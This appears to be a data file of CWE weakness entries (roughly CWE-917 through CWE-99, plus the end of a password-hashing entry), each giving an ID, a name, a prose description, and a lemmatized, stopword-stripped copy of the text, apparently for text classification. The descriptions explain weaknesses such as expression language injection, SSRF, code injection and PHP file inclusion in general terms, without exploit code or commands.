likelihood of producing the same hash for multiple different inputs (""collision resistance"")Note that the security requirements for the product may vary depending on the environment and the value of the passwords. Different schemes might not provide all of these properties, yet may still provide sufficient security for the environment. Conversely, a solution might be very strong in preserving one property, which still being very weak for an attack against another property, or it might not be able to significantly reduce the efficiency of a massively-parallel attack.",product generate hash password use scheme provide sufficient level computational effort password cracking attack infeasible expensive password storage mechanism compute hash store hash instead store original password plaintext design authentication involve accept incoming password compute hash compare store hash hash algorithm design execute quickly minimal overhead cryptographic hash efficiency problem password storage reduce attacker workload brute force password cracking attacker obtain hash method sql injection database store hash attacker store hash offline use technique crack password compute hash efficiently build workload modern attack compute large number hash exhaust entire space possible password short time massively parallel computing cloud computing gpu asic fpga hardware scenario efficient hash algorithm help attacker property hash scheme relevant strength offline massively parallel attack cpu time require compute hash memory require compute hash memory hard random value password input hash computation hash know way determine input password produce hash value guess possible input way number possible hash generate scheme low likelihood produce hash multiple different input collision security requirement product vary depend environment value password different scheme provide property provide sufficient security environment conversely solution strong preserve property weak attack property able significantly reduce efficiency massively parallel attack
CWE-917,Improper Neutralization of Special Elements used in an Expression Language Statement ('Expression Language Injection'),"The product constructs all or part of an expression language (EL) statement in a framework such as a Java Server Page (JSP) using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended EL statement before it is executed.Frameworks such as Java Server Page (JSP) allow a developer to insert executable expressions within otherwise-static content. When the developer is not aware of the executable nature of these expressions and/or does not disable them, then if an attacker can inject expressions, this could lead to code execution or other unexpected behaviors.",product construct expression language el statement framework java server page jsp externally influence input upstream component neutralize incorrectly neutralize special element modify intended el statement execute framework java server page jsp allow developer insert executable expression static content developer aware executable nature expression disable attacker inject expression lead code execution unexpected behavior
CWE-918,Server-Side Request Forgery (SSRF),"The web server receives a URL or similar request from an upstream component and retrieves the contents of this URL, but it does not sufficiently ensure that the request is being sent to the expected destination.By providing URLs to unexpected hosts or ports, attackers can make it appear that the server is sending the request, possibly bypassing access controls such as firewalls that prevent the attackers from accessing the URLs directly. The server can be used as a proxy to conduct port scanning of hosts in internal networks, use other URLs such as that can access documents on the system (using file://), or use other protocols such as gopher:// or tftp://, which may provide greater control over the contents of requests.",web server receive url similar request upstream component retrieve content url sufficiently ensure request send expected destination provide url unexpected host port attacker appear server send request possibly bypass access control firewall prevent attacker access url directly server proxy conduct port scanning host internal network use url access document system use protocol provide great control content request
CWE-92,DEPRECATED: Improper Sanitization of Custom Special Characters,"This entry has been deprecated. It originally came from PLOVER, which sometimes defined ""other"" and ""miscellaneous"" categories in order to satisfy exhaustiveness requirements for taxonomies. Within the context of CWE, the use of a more abstract entry is preferred in mapping situations. CWE-75 is a more appropriate mapping.",entry deprecate originally come plover define miscellaneous category order satisfy exhaustiveness requirement taxonomy context cwe use abstract entry prefer mapping situation appropriate mapping
CWE-920,Improper Restriction of Power Consumption,"The product operates in an environment in which power is a limited resource that cannot be automatically replenished, but the product does not properly restrict the amount of power that its operation consumes.In environments such as embedded or mobile devices, power can be a limited resource such as a battery, which cannot be automatically replenished by the product itself, and the device might not always be directly attached to a reliable power source. If the product uses too much power too quickly, then this could cause the device (and subsequently, the product) to stop functioning until power is restored, or increase the financial burden on the device owner because of increased power costs.Normal operation of an application will consume power. However, in some cases, an attacker could cause the application to consume more power than intended, using components such as:DisplayCPUDisk I/OGPSSoundMicrophoneUSB interface",product operate environment power limited resource automatically replenish product properly restrict power operation consume environment embedded mobile device power limited resource battery automatically replenish product device directly attach reliable power source product use power quickly cause device subsequently product stop function power restore increase financial burden device owner increase power cost normal operation application consume power case attacker cause application consume power intend component displaycpudisk ogpssoundmicrophoneusb interface
CWE-921,Storage of Sensitive Data in a Mechanism without Access Control,"The product stores sensitive information in a file system or device that does not have built-in access control.While many modern file systems or devices utilize some form of access control in order to restrict access to data, not all storage mechanisms have this capability. For example, memory cards, floppy disks, CDs, and USB devices are typically made accessible to any user within the system. This can become a problem when sensitive data is stored in these mechanisms in a multi-user environment, because anybody on the system can read or write this data.On Android devices, external storage is typically globally readable and writable by other applications on the device. External storage may also be easily accessible through the mobile device's USB connection or physically accessible through the device's memory card port.",product store sensitive information file system device build access control modern file system device utilize form access control order restrict access datum storage mechanism capability example memory card floppy disk cd usb device typically accessible user system problem sensitive data store mechanism multi user environment anybody system read write data android device external storage typically globally readable writable application device external storage easily accessible mobile device usb connection physically accessible device memory card port
CWE-922,Insecure Storage of Sensitive Information,"The product stores sensitive information without properly limiting read or write access by unauthorized actors.If read access is not properly restricted, then attackers can steal the sensitive information. If write access is not properly restricted, then attackers can modify and possibly delete the data, causing incorrect results and possibly a denial of service.",product store sensitive information properly limit read write access unauthorized actor read access properly restrict attacker steal sensitive information write access properly restrict attacker modify possibly delete datum cause incorrect result possibly denial service
CWE-923,Improper Restriction of Communication Channel to Intended Endpoints,"The product establishes a communication channel to (or from) an endpoint for privileged or protected operations, but it does not properly ensure that it is communicating with the correct endpoint.Attackers might be able to spoof the intended endpoint from a different system or process, thus gaining the same level of access as the intended endpoint.While this issue frequently involves authentication between network-based clients and servers, other types of communication channels and endpoints can have this weakness.",product establish communication channel endpoint privileged protected operation properly ensure communicate correct endpoint attacker able spoof intended endpoint different system process gain level access intended endpoint issue frequently involve authentication network base client server type communication channel endpoint weakness
CWE-924,Improper Enforcement of Message Integrity During Transmission in a Communication Channel,"The product establishes a communication channel with an endpoint and receives a message from that endpoint, but it does not sufficiently ensure that the message was not modified during transmission.Attackers might be able to modify the message and spoof the endpoint by interfering with the data as it crosses the network or by redirecting the connection to a system under their control.",product establish communication channel endpoint receive message endpoint sufficiently ensure message modify transmission attacker able modify message spoof endpoint interfere data cross network redirect connection system control
CWE-925,Improper Verification of Intent by Broadcast Receiver,"The Android application uses a Broadcast Receiver that receives an Intent but does not properly verify that the Intent came from an authorized source.Certain types of Intents, identified by action string, can only be broadcast by the operating system itself, not by third-party applications. However, when an application registers to receive these implicit system intents, it is also registered to receive any explicit intents. While a malicious application cannot send an implicit system intent, it can send an explicit intent to the target application, which may assume that any received intent is a valid implicit system intent and not an explicit intent from another application. This may lead to unintended behavior.",android application use broadcast receiver receive intent properly verify intent come authorized source certain type intent identify action string broadcast operate system party application application register receive implicit system intent register receive explicit intent malicious application send implicit system intent send explicit intent target application assume receive intent valid implicit system intent explicit intent application lead unintended behavior
CWE-926,Improper Export of Android Application Components,"The Android application exports a component for use by other applications, but does not properly restrict which applications can launch the component or access the data it contains.The attacks and consequences of improperly exporting a component may depend on the exported component:If access to an exported Activity is not restricted, any application will be able to launch the activity. This may allow a malicious application to gain access to sensitive information, modify the internal state of the application, or trick a user into interacting with the victim application while believing they are still interacting with the malicious application.If access to an exported Service is not restricted, any application may start and bind to the Service. Depending on the exposed functionality, this may allow a malicious application to perform unauthorized actions, gain access to sensitive information, or corrupt the internal state of the application.If access to a Content Provider is not restricted to only the expected applications, then malicious applications might be able to access the sensitive data. Note that in Android before 4.2, the Content Provider is automatically exported unless it has been explicitly declared as NOT exported.",android application export component use application properly restrict application launch component access datum contain attack consequence improperly export component depend export component access export activity restrict application able launch activity allow malicious application gain access sensitive information modify internal state application trick user interact victim application believe interact malicious application access export service restrict application start bind service depend expose functionality allow malicious application perform unauthorized action gain access sensitive information corrupt internal state application access content provider restrict expect application malicious application able access sensitive datum note android content provider automatically export explicitly declare export
CWE-927,Use of Implicit Intent for Sensitive Communication,"The Android application uses an implicit intent for transmitting sensitive data to other applications.Since an implicit intent does not specify a particular application to receive the data, any application can process the intent by using an Intent Filter for that intent. This can allow untrusted applications to obtain sensitive data. There are two variations on the standard broadcast intent, ordered and sticky.Ordered broadcast intents are delivered to a series of registered receivers in order of priority as declared by the Receivers. A malicious receiver can give itself a high priority and cause a denial of service by stopping the broadcast from propagating further down the chain. There is also the possibility of malicious data modification, as a receiver may also alter the data within the Intent before passing it on to the next receiver. The downstream components have no way of asserting that the data has not been altered earlier in the chain.Sticky broadcast intents remain accessible after the initial broadcast. An old sticky intent will be broadcast again to any new receivers that register for it in the future, greatly increasing the chances of information exposure over time. Also, sticky broadcasts cannot be protected by permissions that may apply to other kinds of intents.In addition, any broadcast intent may include a URI that references data that the receiving component does not normally have the privileges to access. The sender of the intent can include special privileges that grant the receiver read or write access to the specific URI included in the intent. A malicious receiver that intercepts this intent will also gain those privileges and be able to read or write the resource at the specified URI.",android application use implicit intent transmit sensitive datum application implicit intent specify particular application receive datum application process intent intent filter intent allow untrusted application obtain sensitive datum variation standard broadcast intent order sticky order broadcast intent deliver series register receiver order priority declare receiver malicious receiver high priority cause denial service stop broadcast propagate chain possibility malicious datum modification receiver alter datum intent pass receiver downstream component way assert data alter early chain sticky broadcast intent remain accessible initial broadcast old sticky intent broadcast new receiver register future greatly increase chance information exposure time sticky broadcast protect permission apply kind intent addition broadcast intent include uri reference datum receive component normally privilege access sender intent include special privilege grant receiver read write access specific uri include intent malicious receiver intercept intent gain privilege able read write resource specify uri
CWE-93,Improper Neutralization of CRLF Sequences ('CRLF Injection'),"The product uses CRLF (carriage return line feeds) as a special element, e.g. to separate lines or records, but it does not neutralize or incorrectly neutralizes CRLF sequences from inputs.",product use crlf carriage return line feed special element separate line record neutralize incorrectly neutralize crlf sequence input
CWE-939,Improper Authorization in Handler for Custom URL Scheme,"The product uses a handler for a custom URL scheme, but it does not properly restrict which actors can invoke the handler using the scheme.Mobile platforms and other architectures allow the use of custom URL schemes to facilitate communication between applications. In the case of iOS, this is the only method to do inter-application communication. The implementation is at the developer's discretion which may open security flaws in the application. An example could be potentially dangerous functionality such as modifying files through a custom URL scheme.",product use handler custom url scheme properly restrict actor invoke handler scheme mobile platform architecture allow use custom url scheme facilitate communication application case ios method inter application communication implementation developer discretion open security flaw application example potentially dangerous functionality modify file custom url scheme
CWE-94,Improper Control of Generation of Code ('Code Injection'),"The product constructs all or part of a code segment using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the syntax or behavior of the intended code segment.When a product allows a user's input to contain code syntax, it might be possible for an attacker to craft the code in such a way that it will alter the intended control flow of the product. Such an alteration could lead to arbitrary code execution.Injection problems encompass a wide variety of issues -- all mitigated in very different ways. For this reason, the most effective way to discuss these weaknesses is to note the distinct features which classify them as injection weaknesses. The most important issue to note is that all injection problems share one thing in common -- i.e., they allow for the injection of control plane data into the user-controlled data plane. This means that the execution of the process may be altered by sending code in through legitimate data channels, using no other mechanism. While buffer overflows, and many other flaws, involve the use of some further issue to gain execution, injection problems need only for the data to be parsed. The most classic instantiations of this category of weakness are SQL injection and format string vulnerabilities.",product construct code segment externally influence input upstream component neutralize incorrectly neutralize special element modify syntax behavior intend code segment product allow user input contain code syntax possible attacker craft code way alter intended control flow product alteration lead arbitrary code execution injection problem encompass wide variety issue mitigate different way reason effective way discuss weakness note distinct feature classify injection weakness important issue note injection problem share thing common allow injection control plane datum user control data plane mean execution process alter send code legitimate datum channel mechanism buffer overflow flaw involve use issue gain execution injection problem need datum parse classic instantiation category weakness sql injection format string vulnerability
CWE-940,Improper Verification of Source of a Communication Channel,"The product establishes a communication channel to handle an incoming request that has been initiated by an actor, but it does not properly verify that the request is coming from the expected origin.When an attacker can successfully establish a communication channel from an untrusted origin, the attacker may be able to gain privileges and access unexpected functionality.",product establish communication channel handle incoming request initiate actor properly verify request come expected origin attacker successfully establish communication channel untrusted origin attacker able gain privilege access unexpected functionality
CWE-941,Incorrectly Specified Destination in a Communication Channel,"The product creates a communication channel to initiate an outgoing request to an actor, but it does not correctly specify the intended destination for that actor.Attackers at the destination may be able to spoof trusted servers to steal data or cause a denial of service.There are at least two distinct weaknesses that can cause the product to communicate with an unintended destination:If the product allows an attacker to control which destination is specified, then the attacker can cause it to connect to an untrusted or malicious destination. For example, because UDP is a connectionless protocol, UDP packets can be spoofed by specifying a false source address in the packet; when the server receives the packet and sends a reply, it will specify a destination by using the source of the incoming packet - i.e., the false source. The server can then be tricked into sending traffic to the wrong host, which is effective for hiding the real source of an attack and for conducting a distributed denial of service (DDoS). As another example, server-side request forgery (SSRF) and XML External Entity (XXE) can be used to trick a server into making outgoing requests to hosts that cannot be directly accessed by the attacker due to firewall restrictions.If the product incorrectly specifies the destination, then an attacker who can control this destination might be able to spoof trusted servers. While the most common occurrence is likely due to misconfiguration by an administrator, this can be resultant from other weaknesses. For example, the product might incorrectly parse an e-mail or IP address and send sensitive data to an unintended destination. As another example, an Android application may use a ""sticky broadcast"" to communicate with a receiver for a particular application, but since sticky broadcasts can be processed by *any* receiver, this can allow a malicious application to access restricted data that was only intended for a different application.",product create communication channel initiate outgoing request actor correctly specify intend destination actor attacker destination able spoof trusted server steal datum cause denial service distinct weakness cause product communicate unintended destination product allow attacker control destination specify attacker cause connect untrusted malicious destination example udp connectionless protocol udp packet spoof specify false source address packet server receive packet send reply specify destination source incoming packet false source server trick send traffic wrong host effective hide real source attack conduct distribute denial service ddos example server request forgery ssrf xml external entity xxe trick server make outgoing request host directly access attacker firewall restriction product incorrectly specify destination attacker control destination able spoof trust server common occurrence likely misconfiguration administrator resultant weakness example product incorrectly parse e mail ip address send sensitive datum unintended destination example android application use sticky broadcast communicate receiver particular application sticky broadcast process receiver allow malicious application access restricted datum intend different application
CWE-942,Permissive Cross-domain Policy with Untrusted Domains,"The product uses a cross-domain policy file that includes domains that should not be trusted.A cross-domain policy file (""crossdomain.xml"" in Flash and ""clientaccesspolicy.xml"" in Silverlight) defines a list of domains from which a server is allowed to make cross-domain requests. When making a cross-domain request, the Flash or Silverlight client will first look for the policy file on the target server. If it is found, and the domain hosting the application is explicitly allowed to make requests, the request is made.Therefore, if a cross-domain policy file includes domains that should not be trusted, such as when using wildcards, then the application could be attacked by these untrusted domains.An overly permissive policy file allows many of the same attacks seen in Cross-Site Scripting (CWE-79). Once the user has executed a malicious Flash or Silverlight application, they are vulnerable to a variety of attacks. The attacker could transfer private information, such as cookies that may include session information, from the victim's machine to the attacker. The attacker could send malicious requests to a web site on behalf of the victim, which could be especially dangerous to the site if the victim has administrator privileges to manage that site.In many cases, the attack can be launched without the victim even being aware of it.",product use cross domain policy file include domain trust cross domain policy file flash silverlight define list domain server allow cross domain request make cross domain request flash silverlight client look policy file target server find domain host application explicitly allow request request cross domain policy file include domain trust wildcard application attack untrusted domain overly permissive policy file allow attack see cross site scripting user execute malicious flash silverlight application vulnerable variety attack attacker transfer private information cookie include session information victim machine attacker attacker send malicious request web site behalf victim especially dangerous site victim administrator privilege manage site case attack launch victim aware
CWE-943,Improper Neutralization of Special Elements in Data Query Logic,"The product generates a query intended to access or manipulate data in a data store such as a database, but it does not neutralize or incorrectly neutralizes special elements that can modify the intended logic of the query.Depending on the capabilities of the query language, an attacker could inject additional logic into the query to:Modify the intended selection criteria, thus changing which data entities (e.g., records) are returned, modified, or otherwise manipulatedAppend additional commands to the queryReturn more entities than intendedReturn fewer entities than intendedCause entities to be sorted in an unexpected wayThe ability to execute additional commands or change which entities are returned has obvious risks. But when the product logic depends on the order or number of entities, this can also lead to vulnerabilities. For example, if the query expects to return only one entity that specifies an administrative user, but an attacker can change which entities are returned, this could cause the logic to return information for a regular user and incorrectly assume that the user has administrative privileges.While this weakness is most commonly associated with SQL injection, there are many other query languages that are also subject to injection attacks, including HTSQL, LDAP, DQL, XQuery, Xpath, and ""NoSQL"" languages.",product generate query intend access manipulate datum data store database neutralize incorrectly neutralize special element modify intended logic query depend capability query language attacker inject additional logic query modify intended selection criterion change datum entity record return modify manipulatedappend additional command queryreturn entity intendedreturn few entity intendedcause entity sort unexpected waythe ability execute additional command change entity return obvious risk product logic depend order number entity lead vulnerability example query expect return entity specify administrative user attacker change entity return cause logic return information regular user incorrectly assume user administrative privilege weakness commonly associate sql injection query language subject injection attack include htsql ldap dql xquery xpath nosql language
CWE-95,Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection'),"The product receives input from an upstream component, but it does not neutralize or incorrectly neutralizes code syntax before using the input in a dynamic evaluation call (e.g. ""eval"").This may allow an attacker to execute arbitrary code, or at least modify what code can be executed.",product receive input upstream component neutralize incorrectly neutralize code syntax input dynamic evaluation allow attacker execute arbitrary code modify code execute
CWE-96,Improper Neutralization of Directives in Statically Saved Code ('Static Code Injection'),"The product receives input from an upstream component, but it does not neutralize or incorrectly neutralizes code syntax before inserting the input into an executable resource, such as a library, configuration file, or template.",product receive input upstream component neutralize incorrectly neutralize code syntax insert input executable resource library configuration file template
CWE-97,Improper Neutralization of Server-Side Includes (SSI) Within a Web Page,"The product generates a web page, but does not neutralize or incorrectly neutralizes user-controllable input that could be interpreted as a server-side include (SSI) directive.",product generate web page neutralize incorrectly neutralize user controllable input interpret server include ssi directive
CWE-98,Improper Control of Filename for Include/Require Statement in PHP Program ('PHP Remote File Inclusion'),"The PHP application receives input from an upstream component, but it does not restrict or incorrectly restricts the input before its usage in ""require,"" ""include,"" or similar functions.In certain versions and configurations of PHP, this can allow an attacker to specify a URL to a remote location from which the product will obtain the code to execute. In other cases in association with path traversal, the attacker can specify a local file that may contain executable statements that can be parsed by PHP.",php application receive input upstream component restrict incorrectly restrict input usage require include similar function certain version configuration php allow attacker specify url remote location product obtain code execute case association path traversal attacker specify local file contain executable statement parse php
CWE-99,Improper Control of Resource Identifiers ('Resource Injection'),"The product receives input from an upstream component, but it does not restrict or incorrectly restricts the input before it is used as an identifier for a resource that may be outside the intended sphere of control.A resource injection issue occurs when the following two conditions are met:An attacker can specify the identifier used to access a system resource. For example, an attacker might be able to specify part of the name of a file to be opened or a port number to be used.By specifying the resource, the attacker gains a capability that would not otherwise be permitted. For example, the program may give the attacker the ability to overwrite the specified file, run with a configuration controlled by the attacker, or transmit sensitive information to a third-party server.This may enable an attacker to access or modify otherwise protected system resources.",product receive input upstream component restrict incorrectly restrict input identifier resource outside intended sphere control resource injection issue occur follow condition meet attacker specify identifier access system resource example attacker able specify file open port number specify resource attacker gain capability permit example program attacker ability overwrite specify file run configuration control attacker transmit sensitive information party server enable attacker access modify protect system resource
